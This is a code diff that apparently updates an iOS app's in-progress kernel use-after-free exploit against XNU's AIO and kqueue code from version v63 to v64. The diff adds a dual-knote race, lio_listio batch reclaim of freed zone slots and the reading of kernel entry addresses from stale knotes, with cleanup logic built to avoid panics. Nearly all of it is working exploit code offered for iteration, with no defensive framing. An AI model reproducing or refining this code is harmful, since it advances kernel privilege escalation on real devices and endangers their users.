@@ -247,20 +247,18 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v63: v62 + lio_listio batch reclaim. v62 showed ext[1]=0x2005/0x2006,
-// meaning 5-6 alien zallocs stole tcb from the magazine top between
-// aio_return(tcb) and sequential aio_read(rcbs[i]) calls. v63 replaces
-// the 7 sequential aio_read syscalls with a single lio_listio(LIO_NOWAIT)
-// batch — all zallocs happen in the same kernel context, slashing the
-// alien-interference window.
-// Key design (from v44/v58/v59/v60/v62):
-//   1. Zone priming: 7 dummy AIO before lio_listio
-//   2. Racer started AFTER lio_listio
-//   3. Single file, no F_NOCACHE
-//   4. Wait for reclaim entries to complete before kevent64
-//   5. kevent64 on exploit thread, not racer
-//   6. All logging deferred to after kevent64+close(kq)
-//   7. Unique nbytes per reclaim entry -> ext[1] identifies victim
+// v64: v63 + dual-knote Phase B experiment. v63 proved LIFO reclaim works
+// with lio_listio batch (ext[1]=0x2000 = rcbs[0] occupying tcb's old slot).
+// v64 adds kq2 — rcbs[0] uses SIGEV_KEVENT on kq2 instead of SIGEV_NONE.
+// Phase A kevent64(kq) reads stale knote (workq entry). Phase B kevent64(kq2)
+// reads fresh knote (doneq entry). The key question: does the second kevent64
+// crash (FAR=0x58)? If not, TAILQ_REMOVE on doneq entry is validated.
+// Key design:
+//   1. 7x zone priming, lio_listio batch reclaim (from v63)
+//   2. rcbs[0] SIGEV_KEVENT on kq2 — creates second knote to same slot S
+//   3. Phase A: kevent64(kq) — stale knote, entry on workq/doneq
+//   4. Phase B: kevent64(kq2) — fresh knote, entry on doneq (TAILQ_REMOVE test)
+//   5. Compare ext[] from both phases — if different, we learn about entry state
 
 #define V63_NRECLAIM 7
 
@@ -277,8 +275,11 @@ struct v63_race_state {
 struct v63_state {
     int fd;                    // single file for all AIO operations
     int kq;
+    int kq2;                   // v64: second kqueue for rcbs[0]'s knote
     struct kevent64_s kev;
+    struct kevent64_s kev2;    // v64: Phase B kevent result
     int nev;
+    int nev2;                  // v64: Phase B kevent count
     int err;
     int freed;
     int reclaimed;
@@ -368,6 +369,11 @@ static void *v63_exploit_thread(void *arg) {
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
 
+    // v64: second kqueue for rcbs[0]'s SIGEV_KEVENT knote
+    int kq2 = kqueue();
+    if (kq2 < 0) { st->err = errno; close(kq); return NULL; }
+    st->kq2 = kq2;
+
     // All AIO ops use the same single file
     struct aiocb tcb;
     char tbuf[4096];
@@ -389,7 +395,13 @@ static void *v63_exploit_thread(void *arg) {
         rcbs[i].aio_nbytes = 8192 + i;   // unique per entry: 8192..8198
         rcbs[i].aio_offset = 0;
         rcbs[i].aio_lio_opcode = LIO_READ;
-        rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        // v64: rcbs[0] with SIGEV_KEVENT on kq2 — creates second knote to slot S
+        if (i == 0) {
+            rcbs[i].aio_sigevent.sigev_notify = SIGEV_KEVENT;
+            rcbs[i].aio_sigevent.sigev_signo = kq2;
+        } else {
+            rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        }
     }
 
     // v63 KEY: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64
@@ -423,6 +435,7 @@ static void *v63_exploit_thread(void *arg) {
         while (aio_error(&tcb) == EINPROGRESS) usleep(500);
         aio_return(&tcb);
         close(kq);
+        close(kq2);
         if (st->diag_path[0] != '\0') {
             int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
             if (dfd >= 0) {
@@ -438,6 +451,7 @@ static void *v63_exploit_thread(void *arg) {
 
     if (!reclaimed) {
         close(kq);
+        close(kq2);
         if (st->diag_path[0] != '\0') {
             int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
             if (dfd >= 0) {
@@ -455,43 +469,48 @@ static void *v63_exploit_thread(void *arg) {
     for (int i = 0; i < V63_NRECLAIM; i++)
         while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-    // kevent64 on THIS thread (matching v44 and reference exploit)
+    // v64 Phase A: kevent64(kq) — stale knote (tcb's old knote → reclaimed slot S)
     struct kevent64_s kev = {};
     struct timespec ts = {10, 0};
     st->nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
     if (st->nev > 0) st->kev = kev;
 
-    // Write diag AFTER kevent64+close(kq) — deferred logging
+    // v64 Phase B: kevent64(kq2) — fresh knote (rcbs[0]'s knote → doneq entry).
+    // Called IMMEDIATELY after Phase A. If entry was alive for Phase A (TAILQ_REMOVE
+    // from doneq + zfree), Phase B reads from the same slot — may succeed (entry
+    // not zeroed yet) or crash (FAR=0x58 if procp already zeroed).
+    // timeout=0: non-blocking, the knote should already be activated by worker.
+    struct kevent64_s kev2 = {};
+    struct timespec ts2 = {0, 0};
+    st->nev2 = kevent64(kq2, NULL, 0, &kev2, 1, 0, &ts2);
+    if (st->nev2 > 0) st->kev2 = kev2;
+
+    // Write diag AFTER kevent64 + close(kq) + close(kq2) — deferred logging
     close(kq);
+    close(kq2);
     if (st->diag_path[0] != '\0') {
         int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (dfd >= 0) {
             char dbuf[512];
             int dlen = snprintf(dbuf, sizeof(dbuf),
-                "freed=%d reclaimed=%d nev=%d ret=%zd\n",
-                freed, reclaimed ? 1 : 0, st->nev, ret_result);
+                "freed=%d reclaimed=%d nevA=%d nevB=%d ret=%zd\n",
+                freed, reclaimed ? 1 : 0, st->nev, st->nev2, ret_result);
             write(dfd, dbuf, dlen); fsync(dfd); close(dfd);
         }
     }
 
-    // v63: Smart cleanup — identify kevent64 victim via ext[1] (returnval==nbytes).
-    // filt_aioprocess already freed one reclaim entry via aio_entry_unref.
-    // We match ext[1] against unique nbytes to skip only the consumed entry,
-    // preventing double-free while still cleaning up the other entries.
-    // On failure (nev<=0), clean up all entries normally.
-    if (st->nev > 0) {
-        uint64_t victim_nbytes = st->kev.ext[1];
-        for (int i = 0; i < V63_NRECLAIM; i++) {
-            uint64_t my_nbytes = 8192 + i;
-            if (victim_nbytes == my_nbytes) continue;  // already freed by filt_aioprocess
-            if (aio_error(&rcbs[i]) != EINVAL)
-                aio_return(&rcbs[i]);
-        }
-    } else {
-        for (int i = 0; i < V63_NRECLAIM; i++) {
-            if (aio_error(&rcbs[i]) != EINVAL)
-                aio_return(&rcbs[i]);
-        }
+    // v64: Smart cleanup with two potential victims.
+    // Phase A kevent64(kq) freed one reclaim entry via aio_entry_unref.
+    // Phase B kevent64(kq2) may have freed rcbs[0] via aio_entry_unref.
+    // Match ext[1] against unique nbytes to skip consumed entries.
+    uint64_t victimA = (st->nev > 0) ? st->kev.ext[1] : 0;
+    uint64_t victimB = (st->nev2 > 0) ? st->kev2.ext[1] : 0;
+    for (int i = 0; i < V63_NRECLAIM; i++) {
+        uint64_t my_nbytes = 8192 + i;
+        if (st->nev > 0 && victimA == my_nbytes) continue;  // freed by Phase A
+        if (st->nev2 > 0 && victimB == my_nbytes) continue;  // freed by Phase B
+        if (aio_error(&rcbs[i]) != EINVAL)
+            aio_return(&rcbs[i]);
     }
 
     return NULL;
@@ -563,7 +582,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v63" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5949,7 +5968,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v63 (7x Prime + lio_listio Batch Reclaim) =========="];
+    [self appendLog:@"\n========== AIO UAF v64 (Dual-Knote Phase B Experiment) =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5961,19 +5980,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v63: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v64: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v63.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v64.txt"];
     unlink(diagPath.UTF8String);
 
-    // v63: SINGLE file — all AIO ops use same fd (faithful v44)
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v63.bin"];
+    // v64: SINGLE file — all AIO ops use same fd
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v64.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v63" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5987,8 +6006,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v63: v44 architecture (racer AFTER lio_listio, kevent64 on exploit thread) ----
-    [self appendLog:@"\n--- Phase A v63: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64 ---"];
+    // ---- Phase A v64: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
+    [self appendLog:@"\n--- Phase A v64: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6031,24 +6050,49 @@ static void *e2_free_and_ool_racer(void *arg) {
         }
 
         // kevent64 was called on exploit thread after reclaim completion
-        [self appendLog:[NSString stringWithFormat:@"  kevent64: nev=%d", st.nev]];
+        [self appendLog:[NSString stringWithFormat:@"  Phase A kevent64(kq): nev=%d", st.nev]];
+        [self appendLog:[NSString stringWithFormat:@"  Phase B kevent64(kq2): nev=%d", st.nev2]];
 
         int nev = st.nev;
         struct kevent64_s kev = st.kev;
+        int nev2 = st.nev2;
+        struct kevent64_s kev2 = st.kev2;
 
         if (nev > 0) {
-            [self appendLog:@"  *** DONE ***"];
-            [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
+            [self appendLog:@"  *** Phase A DONE ***"];
+            [self appendLog:[NSString stringWithFormat:@"  kevA.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
                 kev.ident, kev.filter, kev.flags, kev.fflags]];
-            [self appendLog:[NSString stringWithFormat:@"  kev.data=0x%llx udata=0x%llx ext[0]=0x%llx ext[1]=0x%llx",
+            [self appendLog:[NSString stringWithFormat:@"  kevA.data=0x%llx udata=0x%llx extA[0]=0x%llx extA[1]=0x%llx",
                 kev.data, kev.udata, kev.ext[0], kev.ext[1]]];
             if (kev.ident != 0) {
                 entryAddr = kev.ident;
             }
+
+            // v64 Phase B logging — second knote result
+            if (nev2 > 0) {
+                [self appendLog:@"  *** Phase B DONE ***"];
+                [self appendLog:[NSString stringWithFormat:@"  kevB.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
+                    kev2.ident, kev2.filter, kev2.flags, kev2.fflags]];
+                [self appendLog:[NSString stringWithFormat:@"  kevB.data=0x%llx udata=0x%llx extB[0]=0x%llx extB[1]=0x%llx",
+                    kev2.data, kev2.udata, kev2.ext[0], kev2.ext[1]]];
+                // Compare ext[1] values — same means same entry state, different means interesting
+                if (kev2.ext[1] != kev.ext[1]) {
+                    [self appendLog:[NSString stringWithFormat:@"  *** ext[1] DIFFERS: A=0x%llx B=0x%llx (delta=0x%llx) ***",
+                        kev.ext[1], kev2.ext[1],
+                        (kev2.ext[1] > kev.ext[1]) ? (kev2.ext[1] - kev.ext[1]) : (kev.ext[1] - kev2.ext[1])]];
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  ext[1] match: both=0x%llx", kev.ext[1]]];
+                }
+            } else if (nev2 == 0) {
+                [self appendLog:@"  Phase B: timeout (knote not activated — entry was already freed?)"];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  Phase B: kevent64 error %d", nev2]];
+            }
+
             phaseA_won = true;
             break;
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 returned %d — retry", nev]];
+            [self appendLog:[NSString stringWithFormat:@"  Phase A kevent64 returned %d — retry", nev]];
         }
     }
 
@@ -6059,8 +6103,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v63: Health check ----
-    [self appendLog:@"\n--- Phase C v63: Health check ---"];
+    // ---- Phase C v64: Health check ----
+    [self appendLog:@"\n--- Phase C v64: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6086,11 +6130,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v63 Complete =========="];
+    [self appendLog:@"========== AIO UAF v64 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v63" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
